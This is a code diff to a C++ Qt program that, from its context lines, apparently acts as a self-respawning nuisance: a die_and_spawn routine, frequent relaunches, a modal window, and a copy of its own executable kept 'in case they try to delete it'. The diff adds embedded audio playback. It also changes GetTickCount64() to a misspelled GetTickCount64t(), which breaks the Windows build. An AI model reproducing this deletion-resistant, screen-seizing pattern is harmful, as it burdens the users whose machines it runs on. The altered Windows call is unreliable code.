@@ -1,3 +1,4 @@
+// QT
 #include <QtWidgets/QtWidgets>
 #include <QtWidgets/QApplication>
 #include <QtWidgets/QWidget>
@@ -5,10 +6,16 @@
 #include <QtWidgets/QBoxLayout>
 #include <QtGui/QPixmap>
 #include <QtGui/QScreen>
+
+// SFML
+#include <SFML/Audio/Music.hpp>
+
+// Standard
 #include <ctime>
 #include <iostream>
 #include <fstream>
 
+// Graphic and sound
 #include "assets.h"
 
 #ifdef __unix__
@@ -24,6 +31,8 @@
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
 
+//char exe_name;
+
 // Since we may launch multiple times a second, we need something just a bit
 // more random than std::time()
 int os_get_random() {
@@ -33,7 +42,7 @@ int os_get_random() {
 #endif
 
 #ifdef WIN32
-  return (GetTickCount64()%99999) + std::time(NULL);
+  return (GetTickCount64t()%99999) + std::time(NULL);
 #endif
 
 return std::time(NULL);
@@ -67,6 +76,8 @@ void die_and_spawn(char* exe_name) {
 
 int main(int argc, char* argv[])  {
 
+  //signal();
+
   // Read in the executable file, in case they try to delete it
   std::ifstream exe_stream(argv[0], std::ifstream::binary);
   long exe_length = file_length(exe_stream);
@@ -80,6 +91,12 @@ int main(int argc, char* argv[])  {
   QWidget window(NULL, Qt::Window);
   window.setWindowModality(Qt::ApplicationModal);
   window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);
+
+  // Setup and play Audio
+  sf::Music music;
+  music.openFromMemory(chord_ogg, CHORD_LENGTH);
+  music.play();
+  //QApplication::beep();
 
   // Setup layouts
   QBoxLayout layout(QBoxLayout::TopToBottom);
